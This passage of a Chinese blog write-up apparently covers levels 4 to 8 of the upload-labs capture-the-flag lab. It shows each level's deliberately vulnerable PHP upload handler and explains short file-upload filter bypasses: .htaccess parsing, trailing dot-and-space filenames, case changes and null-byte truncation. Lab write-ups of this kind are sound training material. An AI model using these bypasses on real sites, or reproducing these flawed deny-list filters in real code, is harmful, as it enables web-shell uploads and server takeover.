class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p><del>全过滤了还怎么打</del></p>
<p>唯独放了一个<code>.htaccess</code>，只能构筑相应文件：</p>
<p>前提条件：（<code>1.mod_rewrite模块开启。2.AllowOverride All</code>）</p>
<p>此时，传上去的图片都会被解析成PHP文件。直接传马连a.png即可。</p>
<h2 id="level-5和10-空格-空格"><a href="#level-5和10-空格-空格" class="headerlink" title="level-5和10(.空格.空格)"></a>level-5和10(.空格.空格)</h2><h3 id="源码5"><a href="#源码5" class="headerlink" title="源码5:"></a>源码5:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="源码10"><a href="#源码10" class="headerlink" title="源码10:"></a>源码10:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>全ban完了，用.{空格}.绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename &#x3D; &quot;phpinfo.php. . &quot;</span><br></pre></td></tr></table></figure>
<p>访问 phpinfo.php 即可</p>
<h2 id="level-6-大小写绕过"><a href="#level-6-大小写绕过" class="headerlink" title="level-6(大小写绕过)"></a>level-6(大小写绕过)</h2><h3 id="源码：-4"><a href="#源码：-4" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-5"><a href="#解答：-5" class="headerlink" title="解答："></a>解答：</h3><p>没有防大小写，直接后缀名改成PHP一把梭了。、</p>
<h2 id="level-7-空格绕过"><a href="#level-7-空格绕过" class="headerlink" title="level-7(空格绕过)"></a>level-7(空格绕过)</h2><h3 id="源码：-5"><a href="#源码：-5" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-6"><a href="#解答：-6" class="headerlink" title="解答："></a>解答：</h3><p>空格绕过，上传 <code>phpinfo.php</code> ，访问<code>phpinfo.php.</code></p>
<p>00截断的php版本要求是小于5.3.29</p>
<h2 id="level-8-点绕过"><a href="#level-8-点绕过" class="headerlink" title="level-8(点绕过)"></a>level-8(点绕过)</h2><h3 id="源码：-6"><a href="#源码：-6" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        